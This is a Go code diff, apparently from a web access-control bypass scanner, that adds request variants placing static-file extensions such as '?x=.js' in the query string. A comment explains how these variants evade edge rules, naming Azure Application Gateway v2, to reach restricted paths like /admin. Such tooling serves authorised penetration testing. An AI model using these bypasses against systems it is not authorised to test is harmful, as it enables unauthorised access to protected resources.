@@ -3133,11 +3133,22 @@ func requestSuffixTricks(options RequestOptions) {
 		baseURL + pathValue + "?" + "format=json",
 		baseURL + pathValue + "?" + "output=1",
 	}
+	// Static-asset extension placed in the query string rather than the path.
+	// Edge rules that match the full request URI against static-file suffixes
+	// (seen on Azure Application Gateway v2) treat /admin?x=.js as an asset
+	// and skip the restriction, while the origin still serves /admin.
+	queryExtensions := []string{".js", ".css", ".png", ".ico", ".svg"}
+	for _, ext := range queryExtensions {
+		payloads = append(payloads, baseURL+pathValue+"?x="+ext)
+	}
 	if parsedURL.RawQuery != "" {
 		payloads = append(payloads,
 			baseURL+pathValue+";?"+parsedURL.RawQuery,
 			baseURL+pathValue+".json?"+parsedURL.RawQuery,
 		)
+		for _, ext := range queryExtensions {
+			payloads = append(payloads, baseURL+pathValue+"?x="+ext+"&"+parsedURL.RawQuery)
+		}
 	}
 	payloads = removeDuplicates(payloads)
 
